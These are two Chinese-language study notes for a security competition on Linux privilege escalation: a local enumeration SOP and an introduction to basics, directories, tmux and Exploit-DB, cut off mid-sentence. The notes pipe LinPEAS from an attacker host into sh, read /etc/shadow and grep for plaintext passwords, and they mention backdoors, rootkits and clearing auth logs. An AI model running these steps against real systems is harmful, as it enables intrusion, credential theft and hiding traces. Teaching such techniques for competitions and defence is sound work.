    <title>Linux提权1：本地枚举与信息收集标准工作流 (SOP)</title>
    <link href="http://example.com/2026/03/15/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%831_%E6%9C%AC%E5%9C%B0%E6%9E%9A%E4%B8%BE%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8C%87%E5%8D%97/"/>
    <id>http://example.com/2026/03/15/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%831_%E6%9C%AC%E5%9C%B0%E6%9E%9A%E4%B8%BE%E4%B8%8E%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%8C%87%E5%8D%97/</id>
    <published>2026-03-15T06:00:00.000Z</published>
    <updated>2026-03-17T13:35:42.585Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Linux-本地枚举与信息收集标准工作流-SOP"><a href="#Linux-本地枚举与信息收集标准工作流-SOP" class="headerlink" title="Linux 本地枚举与信息收集标准工作流 (SOP)"></a>Linux 本地枚举与信息收集标准工作流 (SOP)</h1><p>在获取 Linux 系统的低权限 Shell 后，本地信息收集是决定提权路径的核心环节。其核心目标是通过系统化的信息搜集，绘制出当前运行环境的全貌，并识别潜在的配置缺陷或内核漏洞。</p><p>标准的枚举流程分为<strong>手工枚举</strong>与<strong>自动化枚举</strong>两个阶段。</p><p><strong>建议直接跑自动化脚本</strong>，自动化脚本跑完根据经验来手动收集信息</p><h1 id="手工枚举流程"><a href="#手工枚举流程" class="headerlink" title="手工枚举流程"></a>手工枚举流程</h1><p>手工枚举的目标是在不依赖外部脚本的情况下，快速摸清当前机器的核心状况。在比赛中遇到无法上传文件或环境受限（如没有 <code>curl</code>/<code>wget</code>）时，这是破局的唯一方法。</p><h2 id="系统与架构信息"><a href="#系统与架构信息" class="headerlink" title="系统与架构信息"></a>系统与架构信息</h2><p>确认目标是什么系统、什么架构、内核版本有多老。如果内核版本在特定区间（如 <code>2.6.x</code> 或 <code>3.x</code> 到 <code>5.x</code> 早期），往往可以直接考虑 Dirty COW (CVE-2016-5195) 或 Dirty Pipe (CVE-2022-0847) 等经典内核漏洞。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a                    <span class="comment"># 查看内核版本、系统架构 (x86 还是 x64)</span></span><br><span class="line"><span class="built_in">cat</span> /proc/version           <span class="comment"># 查看内核版本的详细编译信息</span></span><br><span class="line"><span class="built_in">cat</span> /etc/issue              <span class="comment"># 查看发行版标识</span></span><br><span class="line"><span class="built_in">cat</span> /etc/*release           <span class="comment"># 或 lsb_release -a，查看详细的 OS 版本信息</span></span><br><span class="line">lscpu                       <span class="comment"># 查看 CPU 架构信息</span></span><br><span class="line">hostnamectl                 <span class="comment"># 查看主机名、虚拟化平台 (VMware/VBox) 及架构</span></span><br></pre></td></tr></table></figure><h2 id="用户与权限状态-优先级：最高"><a href="#用户与权限状态-优先级：最高" class="headerlink" title="用户与权限状态(优先级：最高)"></a>用户与权限状态(优先级：最高)</h2><p>明确“我是谁”、“还有谁”、“我能免密执行什么”。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">whoami</span>                      <span class="comment"># 查看当前用户名</span></span><br><span class="line"><span class="built_in">id</span>                          <span class="comment"># 查看当前用户的 UID、GID 及所属组 (重点关注 docker, lxd, adm 等高危组)</span></span><br><span class="line"><span class="built_in">id</span> root                     <span class="comment"># 查看 root 用户的基本信息作为对比 (红队补充)</span></span><br><span class="line"><span class="built_in">sudo</span> -l                     <span class="comment"># 【黄金命令】查看当前用户是否可以免密 (NOPASSWD) 运行某些 root 命令</span></span><br><span class="line"><span class="built_in">cat</span> /etc/passwd | grep sh   <span class="comment"># 查看系统上所有具备登录 shell 的用户</span></span><br><span class="line"><span class="built_in">who</span> / w                     <span class="comment"># 查看当前系统有哪些用户登录，以及他们在干什么 (红队补充)</span></span><br><span class="line">last                        <span class="comment"># 查看系统最近的用户登录历史 (红队补充)</span></span><br><span class="line"><span class="built_in">env</span>                         <span class="comment"># 查看环境变量，有时会泄露敏感路径或凭据</span></span><br><span class="line"><span class="built_in">history</span>                     <span class="comment"># 【必看】查看历史命令，往往能发现管理员输错的密码或数据库连接</span></span><br><span class="line"><span class="built_in">ls</span> -liah ~/                 <span class="comment"># 查看家目录下的隐藏文件，重点看 .bash_history 和 .ssh 目录 (红队补充)</span></span><br></pre></td></tr></table></figure><h2 id="网络与路由"><a href="#网络与路由" class="headerlink" title="网络与路由"></a>网络与路由</h2><p>了解靶机在内网中的位置，寻找是否有隐藏的服务仅对本地 <code>127.0.0.1</code> 开放。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ip a || ifconfig            <span class="comment"># 查看所有网卡 IP</span></span><br><span class="line">ip route                    <span class="comment"># 查看路由表，判断网络出口 (红队补充)</span></span><br><span class="line">netstat -antup || ss -antp  <span class="comment"># 查看当前开放的端口及连接 (重点关注只监听本地的高危服务如 MySQL)</span></span><br><span class="line">arp -a || ip neigh          <span class="comment"># 查看 ARP 缓存，发现同网段存活主机，为内网横向做准备 (红队补充)</span></span><br><span class="line"><span class="built_in">cat</span> /etc/hosts              <span class="comment"># 查看内网主机名解析</span></span><br></pre></td></tr></table></figure><h2 id="进程与计划任务"><a href="#进程与计划任务" class="headerlink" title="进程与计划任务"></a>进程与计划任务</h2><p>寻找以 root 身份运行的脆弱进程、不安全的定时任务。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep root          <span class="comment"># 查看 root 运行的进程</span></span><br><span class="line">ps -ef                      <span class="comment"># 另一种查看所有进程的常用命令</span></span><br><span class="line"><span class="built_in">cat</span> /etc/crontab            <span class="comment"># 【高频考点】查看系统级计划任务，重点关注任务调用的脚本我们是否可写</span></span><br><span class="line"><span class="built_in">ls</span> -la /etc/cron.* <span class="comment"># 查看每日/每周/每月的定时任务脚本</span></span><br><span class="line"><span class="comment"># 比赛时如果有条件，推荐上传 pspy 工具，可以动态监控没有读权限的 cron 任务执行情况</span></span><br></pre></td></tr></table></figure><h2 id="文件系统与配置缺陷-核心提权点"><a href="#文件系统与配置缺陷-核心提权点" class="headerlink" title="文件系统与配置缺陷 (核心提权点)"></a>文件系统与配置缺陷 (核心提权点)</h2><p>寻找错误配置的权限，这是最常考的提权点。</p><h3 id="1-危险权限查找"><a href="#1-危险权限查找" class="headerlink" title="1. 危险权限查找"></a>1. 危险权限查找</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 【经典】查找 SUID 文件 (运行该文件时会临时继承其 root 权限)</span></span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【进阶】查找 Capabilities (比 SUID 更隐蔽的权限下放，如 python3 cap_setuid=ep)</span></span><br><span class="line"><span class="built_in">getcap</span> -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找当前用户可写的文件或目录 (配合计划任务漏洞使用)</span></span><br><span class="line">find / -writable -<span class="built_in">type</span> d 2&gt;/dev/null</span><br></pre></td></tr></table></figure><h3 id="2-环境探测-红队精髓"><a href="#2-环境探测-红队精髓" class="headerlink" title="2. 环境探测 (红队精髓)"></a>2. 环境探测 (红队精髓)</h3><p>在你决定用什么语言写反弹 Shell 或提权脚本前，必须先摸清靶机上装了什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一键探测靶机上安装了哪些常用环境和黑客工具 (红队图12)</span></span><br><span class="line"><span class="built_in">which</span> awk perl python ruby gcc vi vim nmap find netcat nc wget tftp ftp tmux screen 2&gt;/dev/null</span><br><span class="line"><span class="comment"># 注：一定要加上 2&gt;/dev/null 把报错信息扔掉，保持终端整洁。</span></span><br></pre></td></tr></table></figure><h3 id="3-敏感信息搜索"><a href="#3-敏感信息搜索" class="headerlink" title="3. 敏感信息搜索"></a>3. 敏感信息搜索</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 检查关键密码文件权限 (如果 shadow 全局可读，直接拿去爆破哈希)</span></span><br><span class="line"><span class="built_in">ls</span> -la /etc/passwd</span><br><span class="line"><span class="built_in">ls</span> -la /etc/shadow</span><br><span class="line"><span class="comment"># 检查磁盘挂载情况 (有时会发现挂载了备份盘或特殊的逻辑卷)</span></span><br><span class="line"><span class="built_in">cat</span> /etc/fstab </span><br><span class="line"><span class="comment"># 查找可能包含明文密码的配置文件 (.conf, .bak, .txt 等)</span></span><br><span class="line">grep --color=auto -rnw <span class="string">&#x27;/&#x27;</span> -ie <span class="string">&quot;PASSWORD=&quot;</span> --color=always 2&gt; /dev/null</span><br></pre></td></tr></table></figure><h1 id="自动化枚举"><a href="#自动化枚举" class="headerlink" title="自动化枚举"></a>自动化枚举</h1><p><strong>核心解题思维：LinPEAS 一把梭</strong></p><p>在 ISW 这种时间紧迫的综合渗透比赛中，<strong>这篇笔记只讲一个工具：LinPEAS</strong>。熟练掌握 LinPEAS 的投递和结果阅读，足以应对绝大多数提权场景。</p><h2 id="下载LinPEAS-攻击机端"><a href="#下载LinPEAS-攻击机端" class="headerlink" title="下载LinPEAS (攻击机端)"></a>下载LinPEAS (攻击机端)</h2><p>在比赛开始前，你的 Kali 机里必须常备最新版的 LinPEAS。下载最新稳定版 <code>linpeas.sh</code> 到你的常用工作目录：</p><p>我放在 <code>~/ISW_Workspace/Tools</code>里了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh</span><br><span class="line"><span class="comment"># 赋予执行权限备用</span></span><br><span class="line"><span class="built_in">chmod</span> +x linpeas.sh</span><br></pre></td></tr></table></figure><h2 id="把LinPEAS部署到靶机"><a href="#把LinPEAS部署到靶机" class="headerlink" title="把LinPEAS部署到靶机"></a>把LinPEAS部署到靶机</h2><p>比赛中靶机的情况千奇百怪（没网、没 curl、没 wget、目录不可写）。以下是三种将 LinPEAS 送进靶机并运行的万能方法，按优先级尝试：</p><h3 id="靶机有网，或与攻击机网络互通"><a href="#靶机有网，或与攻击机网络互通" class="headerlink" title="靶机有网，或与攻击机网络互通"></a>靶机有网，或与攻击机网络互通</h3><p>在你的 Kali (攻击机) 上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启 HTTP 服务 (假设 linpeas.sh在当前目录)</span></span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>在靶机上（直接内存执行，不留痕迹）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl -L http://&lt;Kali-IP&gt;/linpeas.sh | sh</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">wget -qO- http://&lt;Kali-IP&gt;/linpeas.sh | sh</span><br></pre></td></tr></table></figure><h3 id="断网且无下载工具（Base64-大法）"><a href="#断网且无下载工具（Base64-大法）" class="headerlink" title="断网且无下载工具（Base64 大法）"></a>断网且无下载工具（Base64 大法）</h3><p>如果靶机连 <code>curl</code> 和 <code>wget</code> 都没有，或者防火墙拦了入站请求。在你的 Kali (攻击机) 上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将脚本压缩并进行 base64 编码，去掉换行符</span></span><br><span class="line"><span class="built_in">cat</span> linpeas.sh | gzip -9 | <span class="built_in">base64</span> -w 0</span><br><span class="line"><span class="comment"># 将终端输出的那一大串乱码复制下来！</span></span><br></pre></td></tr></table></figure><p>在靶机上：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进入一个大概率可写的目录</span></span><br><span class="line"><span class="built_in">cd</span> /tmp </span><br><span class="line"><span class="comment"># 将乱码还原成脚本并执行</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&lt;这里粘贴你复制的那一大坨Base64乱码&gt;&quot;</span> | <span class="built_in">base64</span> -d | gzip -d &gt; lin.sh</span><br><span class="line"><span class="built_in">chmod</span> +x lin.sh</span><br><span class="line">./lin.sh</span><br></pre></td></tr></table></figure><h3 id="极其受限的-Shell（直接通过-SSH-NC-喂进去）"><a href="#极其受限的-Shell（直接通过-SSH-NC-喂进去）" class="headerlink" title="极其受限的 Shell（直接通过 SSH/NC 喂进去）"></a>极其受限的 Shell（直接通过 SSH/NC 喂进去）</h3><p>如果你是通过 nc 反弹的 shell，可以在 Kali 本地直接把脚本“喂”给建立好连接的端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 4444 &lt; linpeas.sh</span><br></pre></td></tr></table></figure><h2 id="如何使用LinPEAS"><a href="#如何使用LinPEAS" class="headerlink" title="如何使用LinPEAS"></a>如何使用LinPEAS</h2><p>把脚本弄上去之后，怎么跑也是有讲究的。直接运行输出太多容易刷屏，推荐以下几种实战跑法：</p><h3 id="标准跑法带日志记录-推荐"><a href="#标准跑法带日志记录-推荐" class="headerlink" title="标准跑法带日志记录 (推荐)"></a>标准跑法带日志记录 (推荐)</h3><p>直接运行会把终端刷满，导致你往回翻的时候卡顿或者信息丢失。使用 <code>tee</code> 命令可以<strong>边看边把结果存入文件</strong>，带上 <code>-r</code> 还能保留颜色编码（颜色极其重要！）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./linpeas.sh | <span class="built_in">tee</span> peass.out</span><br><span class="line"><span class="comment"># 跑完之后，慢慢用 less 查看并保留颜色</span></span><br><span class="line">less -r peass.out</span><br></pre></td></tr></table></figure><h3 id="全面深度扫描-耗时较长，没思路时用"><a href="#全面深度扫描-耗时较长，没思路时用" class="headerlink" title="全面深度扫描 (耗时较长，没思路时用)"></a>全面深度扫描 (耗时较长，没思路时用)</h3><p>加上 <code>-a</code> 参数会执行最彻底的系统检查（包括搜索所有的隐藏文件、深入读取日志等）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linpeas.sh -a | <span class="built_in">tee</span> peass.out</span><br></pre></td></tr></table></figure><h3 id="极速模式-时间紧迫时用"><a href="#极速模式-时间紧迫时用" class="headerlink" title="极速模式 (时间紧迫时用)"></a>极速模式 (时间紧迫时用)</h3><p>如果你只想快速看一眼内核漏洞和基础的配置错误，跳过耗时的文件系统深度搜索：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linpeas.sh -s</span><br></pre></td></tr></table></figure><h2 id="如何分析LinPEAS-的输出"><a href="#如何分析LinPEAS-的输出" class="headerlink" title="如何分析LinPEAS 的输出"></a>如何分析LinPEAS 的输出</h2><p>LinPEAS 运行时会输出几千行，只需要注意下面三种颜色：</p><ol><li><p><strong>红黄高亮</strong><br><strong>含义</strong>：极高概率的提权点。<br><strong>常见命中</strong>：</p><ul><li><p>存在严重的内核 CVE 漏洞 (如 Dirty COW)。</p></li><li><p>当前用户有 <code>NOPASSWD</code> 的 sudo 权限。</p></li><li><p>极度危险的 SUID 文件。</p></li></ul><p><strong>动作</strong>：看到红黄底色，直接去GTFOBins 查怎么打。</p></li><li><p><strong>纯红色</strong><br><strong>含义</strong>：安全配置错误或敏感信息泄露。<br><strong>常见命中</strong>：</p><ul><li><p><code>/etc/shadow</code> 文件可读。</p></li><li><p>在 <code>.bash_history</code> 或某处的 <code>.conf</code> 文件里找到了明文密码</p></li><li><p>不安全的计划任务 (Cron Jobs) 指向了你能修改的脚本。</p></li></ul><p>如果红黄色没出结果，把所有红色的字仔细过一遍。</p></li><li><p><strong>青色/蓝色</strong></p><ul><li>帮你快速定位哪些进程是你这个普通用户运行的。</li></ul></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Linux-本地枚举与信息收集标准工作流-SOP&quot;&gt;&lt;a href=&quot;#Linux-本地枚举与信息收集标准工作流-SOP&quot; class=&quot;headerlink&quot; title=&quot;Linux 本地枚举与信息收集标准工作流 (SOP)&quot;&gt;&lt;/a&gt;Linux 本地枚举与信</summary>
      
    
    
    
    <category term="ISW" scheme="http://example.com/categories/ISW/"/>
    
    <category term="Linux提权" scheme="http://example.com/categories/ISW/Linux%E6%8F%90%E6%9D%83/"/>
    
    
    <category term="提权" scheme="http://example.com/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux" scheme="http://example.com/tags/Linux/"/>
    
    <category term="本地信息收集" scheme="http://example.com/tags/%E6%9C%AC%E5%9C%B0%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>Linux提权0：基础知识及离线知识查询</title>
    <link href="http://example.com/2026/03/15/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%830_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%A6%BB%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%9F%A5%E8%AF%A2/"/>
    <id>http://example.com/2026/03/15/ISW/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/Linux%E6%8F%90%E6%9D%830_%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E5%8F%8A%E7%A6%BB%E7%BA%BF%E7%9F%A5%E8%AF%86%E6%9F%A5%E8%AF%A2/</id>
    <published>2026-03-15T02:00:00.000Z</published>
    <updated>2026-03-18T05:15:29.007Z</updated>
    
    <content type="html"><![CDATA[<h1 id="什么是Linux提权"><a href="#什么是Linux提权" class="headerlink" title="什么是Linux提权"></a>什么是Linux提权</h1><p>权限提升（Privilege escalation）是指利用网络或应用软件中的程序漏洞、设计缺陷或配置疏忽来获取对应用程序或用户说法受保护资源的高级访问权限。其结果是，应用程序可以授权获取比应用程序开发者或系统管理员的更高的权限，从而可以执行的动作。</p><p>Linux提权一般是指获取root用户权限的操作过程。</p><p><strong>Linux提权的本质</strong>一方面是信息收集，另一方面是对内核漏洞的掌握情况。</p><h1 id="Linux提权目的"><a href="#Linux提权目的" class="headerlink" title="Linux提权目的"></a>Linux提权目的</h1><p>提权操作有风险为什么还要进行提权？什么情况下需要进行提权？获取高权限之后可以做什么？</p><p>通过执行命令漏洞获取的一个临时shell或者通过Web漏洞获取了一个Webshel​​l后，一般情况下权限都较低。在执行一些重要敏感的操作或者对重要的文件进行修改时无法正常进行，则需要进行提权。Linux安装的数据库、中间件等一般都不以root用户启动的，通过数据库或者中间件获取到的权限是低权限的。</p><p><strong>获取root权限是每个黑客的梦想。</strong></p><ul><li>读取读取服务器中的重要文件：<ul><li>修改root密码</li><li>替换系统命令</li></ul></li><li>在系统中安置残骸的后门：<ul><li>平后门</li><li>Rootkit</li></ul></li><li>保证服务器重启后权限不变：<ul><li>内存后门</li></ul></li></ul><h1 id="linux提权手法分类"><a href="#linux提权手法分类" class="headerlink" title="linux提权手法分类"></a>linux提权手法分类</h1><ul><li><p>以某种方式可以把低权限的脚本以高权限执行</p></li><li><p>服务器运维人员需要输入敏感信息（比如密码之类的）并忘记清理相关信息，我们以某种方式获取</p></li><li><p>对Linux权限体系的上层捕捉拦截或修改凭据信息或权限信息</p></li></ul><h1 id="Linux目录结构初识："><a href="#Linux目录结构初识：" class="headerlink" title="Linux目录结构初识："></a>Linux目录结构初识：</h1><p>理解 Linux 的目录结构，能帮你快速找到敏感配置文件、投递提权脚本，并理解工具的存放逻辑。</p><h2 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h2><ul><li><p><strong>全称</strong>：Optional (可选的)</p></li><li><p><strong>用途</strong>：用于安装附加的软件包。</p></li><li><p><strong>特点</strong>：这里存放的软件通常是一个完整的文件夹，包含了它自己所需的 bin、lib 和配置文件。</p></li><li><p><strong>在Linux提权中的意义</strong>：</p><ul><li><p><strong>工具存放地</strong>：像 <code>exploitdb</code>、<code>google-chrome</code>、<code>nessus</code> 这种不属于 Linux 发行版自带的第三方工具通常装在这里。</p></li><li><p><strong>寻找漏洞</strong>：如果管理员在这里手动安装了一些老旧、有漏洞的商业软件，这里就是提权的突破口。</p></li></ul></li></ul><h2 id="tmp-与-dev-shm"><a href="#tmp-与-dev-shm" class="headerlink" title="/tmp 与 /dev/shm"></a>/tmp 与 /dev/shm</h2><ul><li><p><strong>用途</strong>：存放临时文件。</p></li><li><p><strong>渗透意义</strong>：</p><ul><li><p><strong>全员可写</strong>：几乎所有低权限用户都对这两个目录有 <code>rwx</code> 权限。</p></li><li><p><strong>投递 EXP</strong>：这是你从 Kali 下载 <code>linpeas.sh</code> 或编译好的 ELF 文件到靶机后的<strong>首选存放地</strong>。</p></li><li><p><strong>隐蔽性</strong>：<code>/dev/shm</code> 是内存文件系统，重启即消失，且在内存中运行脚本速度极快，动静更小。</p></li></ul></li></ul><h2 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h2><ul><li><p><strong>用途</strong>：存储系统配置文件。</p></li><li><p><strong>渗透意义</strong>：</p><ul><li><p><strong><code>/etc/passwd</code></strong>：查看系统用户列表。</p></li><li><p><strong><code>/etc/shadow</code></strong>：如果这个文件可读，你可以直接把 Hash 拿走离线爆破（提权核心）。</p></li><li><p><strong><code>/etc/crontab</code></strong>：查看计划任务，寻找定时以 root 权限运行的可写脚本（提权核心）。</p></li></ul></li></ul><h2 id="bin-与-usr-bin"><a href="#bin-与-usr-bin" class="headerlink" title="/bin 与 /usr/bin"></a>/bin 与 /usr/bin</h2><ul><li><p><strong>用途</strong>：存放系统命令（二进制文件）。</p></li><li><p><strong>渗透意义</strong>：</p><ul><li><p><strong>查找 SUID</strong>：你的 <code>find / -perm -u=s</code> 命令搜的就是这里面的文件（如 <code>pkexec</code>, <code>find</code>, <code>vim</code>）。</p></li><li><p><strong>环境变量劫持</strong>：如果你能修改 <code>$PATH</code> 让其优先指向你控制的目录，就能劫持系统命令。</p></li></ul></li></ul><h2 id="var-www-与-var-log"><a href="#var-www-与-var-log" class="headerlink" title="/var/www 与 /var/log"></a>/var/www 与 /var/log</h2><ul><li><p><strong>用途</strong>：<code>/var/www</code> 存网页代码，<code>/var/log</code> 存日志。</p></li><li><p><strong>渗透意义</strong>：</p><ul><li><p><strong>翻找代码</strong>：在 <code>www</code> 目录下寻找数据库连接文件（如 <code>config.php</code>），里面常有明文密码。</p></li><li><p><strong>痕迹清理</strong>：在拿到 root 权限后，黑客通常会清理 <code>/var/log/auth.log</code> 来抹除登录记录。</p></li></ul></li></ul><h2 id="总结建议"><a href="#总结建议" class="headerlink" title="总结建议"></a>总结建议</h2><ol><li><p><strong>想装新工具</strong>：去 <code>/opt</code></p></li><li><p><strong>想传 EXP 到靶机</strong>：去 <code>/tmp</code>。</p></li><li><p><strong>想找系统漏洞</strong>：去 <code>/etc</code> 和 <code>/usr/bin</code>（找 SUID）。</p></li></ol><h1 id="Linux提权过程中可能用到的知识查询书和好用的工具"><a href="#Linux提权过程中可能用到的知识查询书和好用的工具" class="headerlink" title="Linux提权过程中可能用到的知识查询书和好用的工具"></a>Linux提权过程中可能用到的知识查询书和好用的工具</h1><p>一般线下赛是没网的，这时候我们本地必须也有知识库</p><h2 id="Linux命令行"><a href="#Linux命令行" class="headerlink" title="Linux命令行"></a>Linux命令行</h2><p>关于linux基础命令我建议下载一个utools的程序员手册，里面都包含了基础用法</p><h2 id="Tmux"><a href="#Tmux" class="headerlink" title="Tmux"></a>Tmux</h2><p>在渗透测试中，我们经常需要一边看日志，一边敲命令，还得挂着反弹 Shell。<code>tmux</code> 可以让你在一个窗口里搞定所有事情，并且保证任务永不断线。不过这个工具不是必需品，只是一个<strong>优化操作体验</strong>的工具。如果时间不够用建议直接看下面实战立刻就能用上的工具</p><h3 id="下载并配置："><a href="#下载并配置：" class="headerlink" title="下载并配置："></a>下载并配置：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt install tmux -y</span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">vim ~/.tmux.conf</span><br><span class="line"><span class="comment"># 开启鼠标支持</span></span><br><span class="line"><span class="built_in">set</span> -g mouse on</span><br><span class="line"><span class="comment"># 生效配置：在 Tmux 内按 Ctrl + b + : 输入 source-file ~/.tmux.conf</span></span><br></pre></td></tr></table></figure><h3 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h3><p>启动tmux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建一个新的会话 my_work</span></span><br><span class="line">tmux new -s my_work</span><br></pre></td></tr></table></figure><p>tmux所有命令都要加前缀 ctrl + b，按完这个再按其他命令</p><p><strong>基础分屏</strong></p><ul><li><p><strong>左右分屏</strong>：<code>Ctrl + b</code> + <code>%</code></p></li><li><p><strong>上下分屏</strong>：<code>Ctrl + b</code> + <code>&quot;</code></p></li><li><p><strong>关闭当前面板</strong>：输入 <code>exit</code> 或 <code>Ctrl + d</code></p></li></ul><p><strong>空间管理</strong></p><ul><li><strong>全屏化/撤销全屏：</strong><code>Ctrl + b</code> + <code>z</code><br>按一下 <code>z</code> 瞬间全屏，写完再按一下 <code>z</code> 回到分屏模式。</li></ul><p><strong>快速切换</strong></p><ul><li><p><strong>方向切换</strong>：<code>Ctrl + b</code> + <code>方向键</code></p></li><li><p><strong>鼠标切换</strong>：直接点击你想操作的那个区域。</p></li></ul><p>如果使用完了我们可以按ctrl + b + d,这样我们是离开整个会话，但是注意里面的服务还是在运行的</p><p>如果想回到会话就</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tmux <span class="built_in">ls</span> <span class="comment"># 看当前都有哪些会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新连接会话，-t指target</span></span><br><span class="line">tmux a -t my_work</span><br><span class="line"></span><br><span class="line"><span class="comment"># 会话里的服务用不到了可以杀死会话</span></span><br><span class="line">tmux kill-session -t my_work</span><br></pre></td></tr></table></figure><h2 id="Exploit-DB-EXP库"><a href="#Exploit-DB-EXP库" class="headerlink" title="Exploit-DB(EXP库)"></a>Exploit-DB(EXP库)</h2><p>这个是一个非常常用的exp数据库 <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a> ，包含了几乎所有漏洞的exp</p><p>这个工具还有一个和它配套的搜索器<code>searchsploit</code> 留在下一个讲</p><h3 id="EDB包含什么"><a href="#EDB包含什么" class="headerlink" title="EDB包含什么"></a>EDB包含什么</h3><p>每个EDB条目包含下面三部分：</p><p><strong>1.漏洞利用脚本</strong></p><p>这是最核心的部分。它可能是：</p><ul><li><p><strong>C 源代码</strong>：通常需要你下载到靶机或本地编译（如 <code>gcc exploit.c -o exploit</code>）。</p></li><li><p><strong>Python/Ruby/Perl 脚本</strong>：直接运行的自动化工具。</p></li><li><p><strong>文本说明</strong>：手动的操作步骤（Manual PoC）。</p></li></ul><p><strong>2.漏洞描述与影响</strong></p><p>页面会明确告诉你：</p><ul><li><p><strong>软件版本</strong>：例如 <code>Ubuntu 16.04</code> 或 <code>MySQL 5.5.x</code>。</p></li><li><p><strong>漏洞类型</strong>：是“远程代码执行 (RCE)”还是“本地提权 (Privilege 